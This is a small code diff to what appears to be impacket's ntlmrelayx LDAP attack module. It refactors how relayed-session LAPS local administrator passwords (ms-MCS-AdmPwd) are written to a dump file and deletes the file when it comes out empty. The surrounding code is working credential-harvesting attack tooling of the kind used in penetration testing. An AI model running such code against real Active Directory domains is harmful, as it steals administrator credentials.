@@ -27,6 +27,7 @@ import ldap3
 import ldapdomaindump
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
 from ldap3.utils.conv import escape_filter_chars
+import os
 
 from impacket import LOG
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
@@ -586,21 +587,27 @@ class LDAPAttack(ProtocolAttack):
             
             if success:
 
-                fd = open("laps-dump-" + self.username, "w+")
-                for entry in self.client.response:
-                    try:
-                        dn = "DN:" + entry['attributes']['distinguishedname']
-                        passwd = "Password:" + entry['attributes']['ms-MCS-AdmPwd']
+                filename = "laps-dump-" + self.username
+                with open(filename, "a+") as fd:
 
-                        LOG.debug(dn)
-                        LOG.debug(passwd)
+                    for entry in self.client.response:
+                        try:
 
-                        fd.write(dn)
-                        fd.write("\n")
-                        fd.write(passwd)
-                        fd.write("\n")
-                    except:
-                        continue
+                            dn = "DN:" + entry['attributes']['distinguishedname']
+                            passwd = "Password:" + entry['attributes']['ms-MCS-AdmPwd']
+
+                            LOG.debug(dn)
+                            LOG.debug(passwd)
+
+                            fd.write(dn)
+                            fd.write("\n")
+                            fd.write(passwd)
+                            fd.write("\n")
+                        except:
+                            continue
+
+                if os.stat(filename).st_size == 0:
+                    os.remove(filename)
 
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
